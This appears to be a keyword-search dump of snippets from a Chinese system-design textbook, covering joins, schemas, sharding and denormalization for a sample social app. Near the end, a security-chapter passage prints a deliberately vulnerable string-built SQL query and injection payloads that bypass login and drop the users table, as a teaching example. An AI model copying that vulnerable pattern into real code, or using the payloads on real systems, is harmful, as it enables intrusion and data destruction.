  c05_b02.md: ...#### Join 的力量  关系模型的强大之处在于，你可以通过 **join（连接）** 表来回答复杂问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice...
  c05_b02.md: ...sername, posts.content, posts.created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username...
  c05_b02.md: ...osts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4. 返回用户...
  c05_b03.md: ...一：  * **为 WHERE 子句中频繁出现的列建索引** * **为外键列建索引**（如 `user_id`），让 join 更快 * **为 ORDER BY 用到的列建索引**，如果你经常对大结果集排序 * **不要过度索引**：每个索引都...
  c05_b06.md: ...ontent, posts.created_at, users.username     FROM posts     JOIN follows ON posts.user_id = follows.followed_id     JOIN use...
  c05_b06.md: ...JOIN follows ON posts.user_id = follows.followed_id     JOIN users ON posts.user_id = users.id     WHERE follows.followe...
  c05_b06.md: ...r_id     ORDER BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `follows.follower_id` 和 `posts.created_at` 上有合适的索引，当...
  c05_b06.md: ...关注的人数合理（几百人）时，它很快。当 Alice 关注 10,000（1 万）人、她的 Feed 跨越数百万帖子时，join 会变成大型排序操作。我们将在 Feed 案例研究（第 22 章）解决这个问题。...
  c05_b06.md: ...ontent, posts.created_at, users.username     FROM posts     JOIN follows ON posts.user_id = follows.followed_id     JOIN use...
  c05_b06.md: ...JOIN follows ON posts.user_id = follows.followed_id     JOIN users ON posts.user_id = users.id     WHERE follows.followe...
  c05_b06.md: ...r_id     ORDER BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `follows.follower_id` 和 `posts.created_at` 上有合适的索引，当...
  c05_b06.md: ...关注的人数合理（几百人）时，它很快。当 Alice 关注 10,000（1 万）人、她的 Feed 跨越数百万帖子时，join 会变成大型排序操作。我们将在 Feed 案例研究（第 22 章）解决这个问题。...
  c05_b09.md: ...1. **这列是否频繁出现在生产查询的 WHERE、JOIN 或 ORDER BY 子句中？** 如果不是，索引代价（写入变慢）可能不值得。 2. **表是否足够大，以至于全表扫描...
  c05_b10.md: ...created_at, author.username AS author     FROM mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS auth...
  c05_b10.md: ...mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_id = author.id     WHERE ment...
  c05_b10.md: ...e 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表...
  c05_b10.md: ...)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表快速增长：每天 300 万新点赞。...
  c05_b10.md: ...created_at, author.username AS author     FROM mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS auth...
  c05_b10.md: ...mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_id = author.id     WHERE ment...
  c05_b10.md: ...e 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表...
  c05_b10.md: ...)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表快速增长：每天 300 万新点赞。...
  c06_b01.md: ...Bob 的朋友？”是单次索引查找。但“Alice 的所有朋友的朋友都有谁？”——典型的社交图遍历——需要把友谊表与自身 join，再 join 一次。500 亿行的情况下，这个查询要跑几分钟。  这个问题的正确数据库是什么？  两个谜题的答案都是：...
  c06_b01.md: ...？”是单次索引查找。但“Alice 的所有朋友的朋友都有谁？”——典型的社交图遍历——需要把友谊表与自身 join，再 join 一次。500 亿行的情况下，这个查询要跑几分钟。  这个问题的正确数据库是什么？  两个谜题的答案都是：关系型数据库是...
  c06_b02.md: ...单元读取的层次数据：** 如果一篇博客帖子在展示时总是连同作者信息、标签和评论一起出现，把它们存在一个文档中比 4 表 JOIN 更高效。文档可以一次读取操作取回。  **自然的数据局部性：** 文档存储允许直接嵌套相关数据——用户文档可以嵌入一组...
  c06_b02.md: ...取回。  **自然的数据局部性：** 文档存储允许直接嵌套相关数据——用户文档可以嵌入一组社交链接数组，避免单独的表和 JOIN。   #### 文档存储的 Tradeoffs  **收益：** schema 灵活性、层次数据的自然表达、通常单文档...
  c06_b02.md: ...年）才加入——并且伴随性能开销。跨多个文档建模数据可能带来一致性挑战。  **代价（查询灵活性）：** SQL 的任意 JOIN 能力很难复制。如果你需要频繁跨多个文档集合 join 数据，文档存储很笨拙。它们适合符合文档形状的查询，不适合不符合的...
  c06_b02.md: ...带来一致性挑战。  **代价（查询灵活性）：** SQL 的任意 JOIN 能力很难复制。如果你需要频繁跨多个文档集合 join 数据，文档存储很笨拙。它们适合符合文档形状的查询，不适合不符合的查询。  **代价（冗余）：** 因为你经常把相关数据...
  c06_b02.md: ...ID 或简单过滤取回一个或少量文档来回答 90% 的查询？” 如果是，文档存储很合适。如果你发现自己频繁跨多种文档类型 join，你可能在对抗数据模型——关系型数据库可能更适合你。...
  c06_b02.md: ...单元读取的层次数据：** 如果一篇博客帖子在展示时总是连同作者信息、标签和评论一起出现，把它们存在一个文档中比 4 表 JOIN 更高效。文档可以一次读取操作取回。  **自然的数据局部性：** 文档存储允许直接嵌套相关数据——用户文档可以嵌入一组...
  c06_b02.md: ...取回。  **自然的数据局部性：** 文档存储允许直接嵌套相关数据——用户文档可以嵌入一组社交链接数组，避免单独的表和 JOIN。   #### 文档存储的 Tradeoffs  **收益：** schema 灵活性、层次数据的自然表达、通常单文档...
  c06_b02.md: ...年）才加入——并且伴随性能开销。跨多个文档建模数据可能带来一致性挑战。  **代价（查询灵活性）：** SQL 的任意 JOIN 能力很难复制。如果你需要频繁跨多个文档集合 join 数据，文档存储很笨拙。它们适合符合文档形状的查询，不适合不符合的...
  c06_b02.md: ...带来一致性挑战。  **代价（查询灵活性）：** SQL 的任意 JOIN 能力很难复制。如果你需要频繁跨多个文档集合 join 数据，文档存储很笨拙。它们适合符合文档形状的查询，不适合不符合的查询。  **代价（冗余）：** 因为你经常把相关数据...
  c06_b02.md: ...ID 或简单过滤取回一个或少量文档来回答 90% 的查询？” 如果是，文档存储很合适。如果你发现自己频繁跨多种文档类型 join，你可能在对抗数据模型——关系型数据库可能更适合你。...
  c06_b03.md: ...这就是 Redis。操作是亚毫秒级，因为 Redis 把整个数据集放在内存中。没有索引、没有 schema、没有 join。只有 key 和 value。   #### 键值存储何时胜出  **缓存：** 第一大用例。用 TTL（time-t...
  c06_b03.md: ...每秒 500,000 次写入超过单节点 PostgreSQL 能力 * 查询是对特定行集合的时间范围扫描——不是复杂 join * 数据是仅追加的（你从不更新历史指标）  列族数据库（如 Apache Cassandra）正是为这种场景设计。...
  c06_b04.md: ...* Cassandra 有 CQL，看起来像 SQL，但深受限制。你只能按分区键和聚类键查询。跨分区查询（相当于跨分区 join）很贵，通常不推荐。在 Cassandra 中数据建模需要预先知道你的查询——你围绕访问模式设计 schema，而不是围...
  c06_b04.md: ...5,000 次写入/秒）？” 如果两者都是，研究 Cassandra 或类似系统。如果你的查询不可预测或需要跨多个维度 join，要三思。...
  c06_b05.md: ...OM friendships WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FROM friendships f1...
  c06_b05.md: ...SELECT DISTINCT f2.friend_id     FROM friendships f1     JOIN friendships f2 ON f1.friend_id = f2.user_id     WHERE f1.us...
  c06_b05.md: ...AND f2.friend_id != alice_id;   50 billion（500 亿）行的情况下，这个 join 极其昂贵。“朋友的朋友的朋友”（3 跳）需要三次自 join——基本不可用。  图数据库把数据原生存为节点（node，...
  c06_b05.md: ...50 billion（500 亿）行的情况下，这个 join 极其昂贵。“朋友的朋友的朋友”（3 跳）需要三次自 join——基本不可用。  图数据库把数据原生存为节点（node，实体）和边（edge，关系）。每条边直接指向它连接的节点。从...
  c06_b05.md: ...e，实体）和边（edge，关系）。每条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob...
  c06_b05.md: ...OM friendships WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FROM friendships f1...
  c06_b05.md: ...SELECT DISTINCT f2.friend_id     FROM friendships f1     JOIN friendships f2 ON f1.friend_id = f2.user_id     WHERE f1.us...
  c06_b05.md: ...AND f2.friend_id != alice_id;   50 billion（500 亿）行的情况下，这个 join 极其昂贵。“朋友的朋友的朋友”（3 跳）需要三次自 join——基本不可用。  图数据库把数据原生存为节点（node，...
  c06_b05.md: ...50 billion（500 亿）行的情况下，这个 join 极其昂贵。“朋友的朋友的朋友”（3 跳）需要三次自 join——基本不可用。  图数据库把数据原生存为节点（node，实体）和边（edge，关系）。每条边直接指向它连接的节点。从...
  c06_b05.md: ...e，实体）和边（edge，关系）。每条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob...
  c06_b08.md: ...单元读取：** 客户的备注通常一起展示。把每条备注存为文档意味着取回“客户 123 的所有备注”是单次查询，而不是跨表 JOIN。  3. **schema 演进：** 新的备注类型会随时间增加（视频通话、AI 工具的会议纪要）。给文档 schem...
  c06_b12.md: ...，要么都不提交。  **为什么不用纯文档存储？** 跨记录分析查询（“服用药物 X 且肌酐升高的患者”）需要跨多名患者 join 药物记录和实验室结果。文档存储需要扫描每个患者文档并在应用代码中过滤——慢且复杂。在关系型模型中，这是 SQL joi...
  c06_b12.md: ...oin 药物记录和实验室结果。文档存储需要扫描每个患者文档并在应用代码中过滤——慢且复杂。在关系型模型中，这是 SQL join。...
  c06_b14.md: ...。** 一个带复杂外键关系、触发器和存储过程的关系型 schema 很难迁移到 NoSQL。如果建模时假设永远要关系型 join，然后在规模下发现查询模式不匹配，“默认 PostgreSQL”就变成陷阱。这不是避免 PostgreSQL 的理由——...
  c07_b14.md: ...QL 家族）SocialSnap 主页 Feed 向每个用户展示其所关注人最新帖子的排序列表。Feed 计算昂贵：需要 join `follows` 表和 `posts` 表，按时间/排序分排序，取 Top 50 帖子。每天有 500,000 名活...
  c10_b11.md: ...。需要复杂查询：“显示过去 24 小时内所有状态为 pending、总额超过 500 USD 的订单，并与客户送货偏好 join。”这些查询跨多张表，需要索引和 join。延迟要求是个位数毫秒（订单状态页必须快速加载）。  访问模式：多张表的结构化...
  c10_b11.md: ...有状态为 pending、总额超过 500 USD 的订单，并与客户送货偏好 join。”这些查询跨多张表，需要索引和 join。延迟要求是个位数毫秒（订单状态页必须快速加载）。  访问模式：多张表的结构化关系查询。延迟要求：1-10ms。成本：对...
  c12_b05.md: ...之一。  分片前是 O(1) 查找的简单查询，分片后变成 O(shards) 的扇出操作。按不同 key 分片的表之间 JOIN 在单次查询中变得不可能——你必须执行多次查询，然后在应用代码中合并结果。  再举个例子：“找出 user 1234 的...
  c12_b05.md: ...ser ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分...
  c12_b06.md: ...需要重分片。代价是更多复杂度和更多数据库实例要管理，但可能避免未来灾难性的迁移。   ### 12.6 反规范化——当 JOIN 变贵时  分片前，SocialSnap 的 schema 经过仔细规范化：用户数据在 `users` 表，帖子数据在...
  c12_b06.md: ...仔细规范化：用户数据在 `users` 表，帖子数据在 `posts` 表，好友数据在 `friendships` 表。JOIN 把这些表联系起来。数据库引擎在单台机器上能高效执行这些 JOIN。  按 `user_id` 分片后，`users`...
  c12_b06.md: ...s` 表，好友数据在 `friendships` 表。JOIN 把这些表联系起来。数据库引擎在单台机器上能高效执行这些 JOIN。  按 `user_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shar...
  c12_b06.md: ...er_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种方法是**反规范化（denormalization）**：故意复制...
  c12_b06.md: ...shard 操作。  应对这个问题的一种方法是**反规范化（denormalization）**：故意复制数据以避免 JOIN。   #### 定义：反规范化  **反规范化**是在数据库 schema 中引入冗余，把相同数据存在多个地方，专门为...
  c12_b06.md: ...# 定义：反规范化  **反规范化**是在数据库 schema 中引入冗余，把相同数据存在多个地方，专门为了减少或消除 JOIN 需求的做法。tradeoff（权衡）是写复杂度增加（更新必须传播到所有副本），换取不需要 JOIN 的快速读。  pl...
  c12_b06.md: ...专门为了减少或消除 JOIN 需求的做法。tradeoff（权衡）是写复杂度增加（更新必须传播到所有副本），换取不需要 JOIN 的快速读。  plain 语言：不是维护一个权威用户名副本并在需要时查找，而是直接把用户名复制到每个需要它的表里。现在...
  c12_b06.md: ...plain 语言：不是维护一个权威用户名副本并在需要时查找，而是直接把用户名复制到每个需要它的表里。现在读取帖子时无需 JOIN users 表。但用户名改变时，应用必须同时更新 `users` 表和 `posts` 表中复制了用户名的每一行（可能...
  c12_b06.md: ...Snap 上，`posts` 表可能被反规范化以直接包含作者用户名和头像 URL，消除获取帖子显示时与 `users` JOIN 的需求。tradeoff：如果用户修改用户名，应用必须在 `users` 表以及 `posts` 表中复制了用户名的每...
  c12_b06.md: ...百万行）都更新。  反规范化不是愉快的妥协——在分片系统中它是必要的恶。它用数据库维护一致性的能力（通过关系约束和原子 JOIN）换取处理超过单台数据库容量数据的实际能力。...
  c12_b10.md: ...**Q3.** SocialSnap 把 `username` 字段反规范化到 `posts` 表以避免跨 shard JOIN。用户修改用户名。写出更新过程的伪代码，并指出该过程可能以两种方式失败并导致系统不一致。...
  c12_b13.md: ...均匀分布；范围分片支持范围查询。代价是跨分片查询（需要扇出和合并）、重分片复杂度（改变 shard 数量昂贵）以及跨表 JOIN 的丧失。  分布式事务——必须跨多个 shard 原子的操作——是分片系统最深的痛。两阶段提交提供协议但引入阻塞和延迟...
  c12_b13.md: ...高延迟和运维复杂度。最佳策略是设计数据模型，使共置数据消除大多数跨分片事务。  反规范化是分片的伴生：通过复制数据消除 JOIN，代价是更新复杂度和一致性窗口。  第 13 章，我们将看到微服务如何把“每个服务一个数据库”原则推向极致——不是把一台...
  c13_b01.md: ...库分片以处理写入量。跨分片查询问题立即出现：查询跨越多个 shard 的数据需要在应用代码中写扇出逻辑，跨 shard JOIN 在单次 SQL 查询中基本不可能。团队发现自己在写数据库过去自动做的事。  但想想：如果问题不是分片策略而是共享本身呢...
  c21_b05.md: ...——O(N) 而非 O(log N + 50)。  查询 2（收件箱）：找到用户 A 参与的所有对话及最新消息。这需要 join `conversation_participants` 和 `messages`。为避免全表扫描 `messages`...
  c21_b05.md: ...age_at` 列，每次发消息都更新。收件箱查询变成：`SELECT c.* FROM conversations c JOIN conversation_participants cp ON c.id = cp.conversation_id W...
  c27_b03.md: ...队做过的最艰难的工程项目。跨分片查询（如“找出所有关注用户 X 的用户，而 X 和其关注者可能在不同分片”）需要应用层 join 逻辑。团队花了 3 个月完成这次迁移，包括 6 小时维护窗口执行数据迁移。  **为什么等待：** 分片增加巨大运营复...
  c27_b06.md: ...得低延迟读。”  **v5（分片）时：** “User 表分片（mod N）——写吞吐随分片扩展；跨分片查询需要应用层 join；分片数难以改变。”  **v6（微服务）时：** “微服务分解——独立部署和团队 owning；需要分布式追踪；更高运...

=== users (83 occurrences) ===
  c05_b01.md: ...。每张表代表一种实体类型。每一行代表该实体的一个实例。每一列代表一个属性。  SocialSnap 的初次尝试：  **users 表**  | id | username | email | password_hash | created_at |...
  c05_b01.md: ...-22 |  注意 posts 表里的 `user_id` 列。Post 101 的 `user_id = 1`，指向 users 表中的 Alice。这就是**外键（foreign key）**——一张表中的列引用另一张表的主键。外键是关系模型表达...
  c05_b02.md: ...配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.created_at     FROM posts...
  c05_b02.md: ...me, posts.content, posts.created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username = 'ali...
  c05_b02.md: ...created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.cr...
  c05_b02.md: ...posts     JOIN users ON posts.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查...
  c05_b02.md: ...ated_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3. 过滤出 Alice 的帖子 4. 返回用户名、内容和创建时间...
  c05_b06.md: ...后持久化，并且可以灵活查询。  **SocialSnap v1 schema：**      CREATE TABLE users (         id          SERIAL PRIMARY KEY,         username...
  c05_b06.md: ...SERIAL PRIMARY KEY,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,...
  c05_b06.md: ...EATE TABLE follows (         follower_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         followed_id INTEGER REFERENC...
  c05_b06.md: ...) ON DELETE CASCADE,         followed_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAUL...
  c05_b06.md: ...CREATE TABLE likes (         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         post_id     INTEGER REFERENC...
  c05_b06.md: ...followed_id ON follows(followed_id);  **为什么这样设计 schema：**  `users` 表上的 `follower_count` 和 `following_count` 是**反规范化计数器（denorm...
  c05_b06.md: ...帖子”：      SELECT posts.id, posts.content, posts.created_at, users.username     FROM posts     JOIN follows ON posts.user_id =...
  c05_b06.md: ...OIN follows ON posts.user_id = follows.followed_id     JOIN users ON posts.user_id = users.id     WHERE follows.follower_id =...
  c05_b06.md: ..._id = follows.followed_id     JOIN users ON posts.user_id = users.id     WHERE follows.follower_id = 1  -- Alice 的 user_id...
  c05_b10.md: ...号分隔字符串（“@alice,@bob”）违反关系模型，也让查询很难。想想提及是什么实体，以及它如何与 posts 和 users 关联。  **答案：**  **Schema 扩展：**      CREATE TABLE mentions (...
  c05_b10.md: ...) ON DELETE CASCADE,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAUL...
  c05_b10.md: ...ions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_id = author.id     WHERE mentions.u...
  c05_b10.md: ...id = author.id     WHERE mentions.user_id = (SELECT id FROM users WHERE username = 'alice')     ORDER BY posts.created_at DES...
  c05_b10.md: ...s` 中 Alice 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `...
  c05_b13.md: ...Snap v1 schema 把 `follower_count` 和 `following_count` 直接存在 `users` 表上，而不是在查询时用 `SELECT COUNT(*)` 计算。这是经典的反规范化 tradeoff（权衡）。描述...
  c05_b13.md: ...**讨论：** 不一致场景：假设处理“关注”动作的代码按顺序执行两步——先向 `follows` 插入一行，再更新 `users` 的 `follower_count`。如果应用在第 1 步和第 2 步之间崩溃，或数据库连接断开，`follows`...
  c05_b13.md: ...ollows (follower_id, followed_id) VALUES (1, 2);     UPDATE users SET follower_count = follower_count + 1 WHERE id = 2;     U...
  c05_b13.md: ...ollower_count = follower_count + 1 WHERE id = 2;     UPDATE users SET following_count = following_count + 1 WHERE id = 1;...
  c05_b14.md: ...**SocialSnap v1**：一个由 PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、follows 和 likes。这是一个完整、正确的基础，能在触及限制前处理数万到数十万用户。  这些限制...
  c06_b12.md: ...VARCHAR(50),         author_id       INTEGER REFERENCES users(id),         created_at      TIMESTAMP DEFAULT NOW(),...
  c07_b14.md: ...SocialSnap 的关注计数提出如下缓存架构：不再把 `follower_count` 存在 PostgreSQL users 表中，而是只存在 Redis 里，每次新关注用 `INCR`。Redis 禁用持久化（无 RDB 或 AOF）。这个设...
  c08_b13.md: ...第 7 章的 SocialSnap v2 中，资料缓存 key `user:{user_id}:profile` 存储 users 表的数据：用户名、简介、头像 URL、加入日期等稳定字段。通知计数不是 users 表的一部分——它来自 notifi...
  c08_b13.md: ...r_id}:profile` 存储 users 表的数据：用户名、简介、头像 URL、加入日期等稳定字段。通知计数不是 users 表的一部分——它来自 notifications 表，频繁变化（每次点赞、评论、关注等）。  如果通知计数被包含在资料...
  c09_b08.md: ...T、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42                   → fetch user 42     POST /users...
  c09_b08.md: ...GET  /users/42                   → fetch user 42     POST /users                      → create a new user     PUT  /users/42...
  c09_b08.md: ...T /users                      → create a new user     PUT  /users/42                   → replace user 42's data     PATCH /us...
  c09_b08.md: ...rs/42                   → replace user 42's data     PATCH /users/42                  → partial update of user 42     DELETE...
  c09_b08.md: ...42                  → partial update of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSO...
  c09_b08.md: ...过度取回（Over-fetching）：** REST 端点返回完整资源。如果你只需要用户名和头像 URL，`GET /users/42` 会返回所有字段（简介、邮箱、粉丝数、加入日期等）。额外字段浪费带宽。  **取回不足（Under-fetchi...
  c09_b08.md: ...一个页面可能需要多个资源的数据。要展示 Alice 的资料页（含最近帖子和粉丝数），你可能需要：       GET /users/42           → Alice's profile     GET /users/42/posts...
  c09_b08.md: ...要：       GET /users/42           → Alice's profile     GET /users/42/posts     → Alice's recent posts     GET /users/42/follo...
  c09_b08.md: ...GET /users/42/posts     → Alice's recent posts     GET /users/42/followers → Alice's follower count   三个独立 HTTP 请求，每个都有一次...
  c09_b15.md: ...er_id} 的 TTL。返回 200。       → 活跃客户端每 30 秒调用一次。      GET /api/users/{user_id}/presence       → 返回 { "online": true/false, "last...
  c10_b04.md: ...含：  * 二进制数据本身（文件、图片、视频、文档——任何字节） * 一个 **key**（唯一标识符——通常像路径：`users/42/profile-photo.jpg`） * **元数据**（content type、自定义属性、标签）  对象...
  c10_b04.md: ...e）。概念模型：       Bucket: socialsnap-media         Object key: users/42/profile-photo.jpg         Object key: users/42/cover-pho...
  c10_b04.md: ...Object key: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.j...
  c10_b04.md: ...构。列出“用户 42 的所有对象”是前缀搜索：`LIST objects WHERE key STARTS WITH "users/42/"`。   #### 为什么对象存储能扩展  **无限容量：** 对象存储在成千上万个存储节点上水平扩展。从用户...
  c10_b06.md: ...*方案 1：把照片作为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：  * Po...
  c10_b06.md: ...案 3：存在对象存储中（正确答案）**       Bucket: socialsnap-media     Key: users/42/profile_photo_v3.jpg   照片上传工作流：  1. 用户通过浏览器上传照片。 2. 应用服务...
  c10_b06.md: ...缩、生成缩略图——这些是通过消息队列的后台操作，第 8 章）。 4. 应用服务器把处理后的照片上传到对象存储：`PUT users/42/profile_photo_v3.jpg`。 5. 应用服务器在 PostgreSQL 中存储对象存储 URL：...
  c10_b06.md: ...ile_photo_v3.jpg`。 5. 应用服务器在 PostgreSQL 中存储对象存储 URL：`UPDATE users SET photo_url = 'https://storage.socialsnap.com/users/42/pr...
  c10_b06.md: ...PDATE users SET photo_url = 'https://storage.socialsnap.com/users/42/profile_photo_v3.jpg' WHERE id = 42`。 6. 使用 Redis 使该用户资料...
  c10_b06.md: ...料页。 2. 应用返回资料页，包含 `<img src="https://storage.socialsnap.com/users/42/profile_photo_v3.jpg">`。 3. 用户浏览器直接从对象存储获取图片——完全绕过应用服务器。...
  c10_b12.md: ...好的 key（哈希值均匀散布在哈希空间）能把存储负载均匀分布。  如果 SocialSnap 所有对象 key 都以 `users/42/` 开头（共同前缀），内部存储路由可能把用户 42 的所有对象请求都发到同一存储分片——形成热点。为缓解，有些存...
  c10_b12.md: ...都发到同一存储分片——形成热点。为缓解，有些存储系统建议在 key 中加入随机哈希前缀：       原始 key:  users/42/profile_photo.jpg     优化 key: ab3f/users/42/profile_phot...
  c10_b12.md: ...原始 key:  users/42/profile_photo.jpg     优化 key: ab3f/users/42/profile_photo.jpg  （"ab3f" = hash(42) 截断到 4 字符）   该前缀让 k...
  c10_b14.md: ...5 章索引讨论和第 7 章缓存）SocialSnap 把用户头像照片的对象存储 URL 存在 PostgreSQL `users` 表的 `photo_url` 列。该列包含在第 7 章的资料缓存中（key `user:{id}:profile`）...
  c10_b14.md: ...小化用户可见不一致窗口。  **答案：**  **正确操作顺序：**       1. 上传新照片到对象存储（key: users/42/photo_v4.jpg）     2. 更新 PostgreSQL 的 users.photo_url 为新...
  c10_b14.md: ...新照片到对象存储（key: users/42/photo_v4.jpg）     2. 更新 PostgreSQL 的 users.photo_url 为新 URL     3. 使 Redis 缓存 key user:42:profile 失效...
  c10_b15.md: ...版本化消除了大多数失效问题：**  用户上传新头像时，应用生成包含版本标识的新对象 key：       旧 key: users/42/profile_photo_v3.jpg  → URL: https://cdn.socialsnap.com/...
  c10_b15.md: .../42/profile_photo_v3.jpg  → URL: https://cdn.socialsnap.com/users/42/profile_photo_v3.jpg     新 key: users/42/profile_photo_v...
  c10_b15.md: ...cdn.socialsnap.com/users/42/profile_photo_v3.jpg     新 key: users/42/profile_photo_v4.jpg  → URL: https://cdn.socialsnap.com/...
  c10_b15.md: .../42/profile_photo_v4.jpg  → URL: https://cdn.socialsnap.com/users/42/profile_photo_v4.jpg   因为每次上传 URL 都变，旧 URL 的 CDN 和浏览器缓存根...
  c10_b15.md: ...y 上传。旧对象在异步清理作业删除前一直存在。这里不需要失效——两个对象无害共存。  **2. PostgreSQL `users.photo_url` 列：** 在上传序列第 2 步同步更新。现在存新 URL。这是权威记录——所有其他缓存都源自它。...
  c12_b06.md: ....6 反规范化——当 JOIN 变贵时  分片前，SocialSnap 的 schema 经过仔细规范化：用户数据在 `users` 表，帖子数据在 `posts` 表，好友数据在 `friendships` 表。JOIN 把这些表联系起来。数据库引...
  c12_b06.md: ...表。JOIN 把这些表联系起来。数据库引擎在单台机器上能高效执行这些 JOIN。  按 `user_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard...
  c12_b06.md: ...语言：不是维护一个权威用户名副本并在需要时查找，而是直接把用户名复制到每个需要它的表里。现在读取帖子时无需 JOIN users 表。但用户名改变时，应用必须同时更新 `users` 表和 `posts` 表中复制了用户名的每一行（可能是数百万行）...
  c12_b06.md: ...是直接把用户名复制到每个需要它的表里。现在读取帖子时无需 JOIN users 表。但用户名改变时，应用必须同时更新 `users` 表和 `posts` 表中复制了用户名的每一行（可能是数百万行）。  在 SocialSnap 上，`posts`...
  c12_b06.md: ...SocialSnap 上，`posts` 表可能被反规范化以直接包含作者用户名和头像 URL，消除获取帖子显示时与 `users` JOIN 的需求。tradeoff：如果用户修改用户名，应用必须在 `users` 表以及 `posts` 表中复制...
  c12_b06.md: ...像 URL，消除获取帖子显示时与 `users` JOIN 的需求。tradeoff：如果用户修改用户名，应用必须在 `users` 表以及 `posts` 表中复制了用户名的每一行（可能是数百万行）都更新。  反规范化不是愉快的妥协——在分片系统中...
  c12_b07.md: ...中有一个操作需要原子更新：当用户被收取高级订阅费时，两件事必须一起发生——`payments` 表中创建一条支付记录，`users` 表中把该用户的 `is_premium` 标志设为 TRUE。  单数据库时，这是一个 SQL 事务：...
  c12_b07.md: ...s (user_id, amount, ...) VALUES (42, 9.99, ...);     UPDATE users SET is_premium = TRUE WHERE user_id = 42;     COMMIT;   如果任...
  c12_b07.md: ...如果任一操作失败，事务回滚——支付记录消失，用户仍是非高级。数据库保证原子性。  分片后，`payments` 和 `users` 可能在不同 shard（如果按不同 key 分片），也可能在同一 shard（如果都按 `user_id` 分片）。...
  c12_b11.md: ...用户名存在两个地方：users 表和每条 post 行。  **答案：** 伪代码：       1. UPDATE users SET userna...
  c12_b11.md: ...用户名存在两个地方：users 表和每条 post 行。  **答案：** 伪代码：       1. UPDATE users SET username = 'new_name' WHERE user_id = 42;  // 在用户所在 sha...
  c12_b11.md: ...7 章）。   失败场景：  **失败 1：** 应用在完成第 1 步后、但在完成第 2 步所有 shard 前崩溃。`users` 表显示新用户名，但某些 shard 的 `posts` 表仍显示旧用户名。用户现在看到旧帖子上是旧用户名，新帖子上是...
  c17_b06.md: ...thors (110ms)               [88ms - 190ms] Database: SELECT users WHERE id IN (...) (102ms)           [202ms - 235ms] Redis:...
  c19_b06.md: ...input = request.get("username")     query = f"SELECT * FROM users WHERE username = '{user_input}'"     db.execute(query)   如果...
  c19_b06.md: ...db.execute(query)   如果用户提交用户名 `alice`，查询变成 `SELECT * FROM users WHERE username = 'alice'`——无害。  但如果用户提交 `' OR '1'='1`，查询变成：...
  c19_b06.md: ...ice'`——无害。  但如果用户提交 `' OR '1'='1`，查询变成：       SELECT * FROM users WHERE username = '' OR '1'='1'   条件 `'1'='1'` 永远为真，因此该查询返回数...
  c19_b06.md: ...` 永远为真，因此该查询返回数据库中所有用户。攻击者完全绕过了认证。  更具破坏性的输入：`'; DROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE username = '';...
  c19_b06.md: ...破坏性的输入：`'; DROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表...
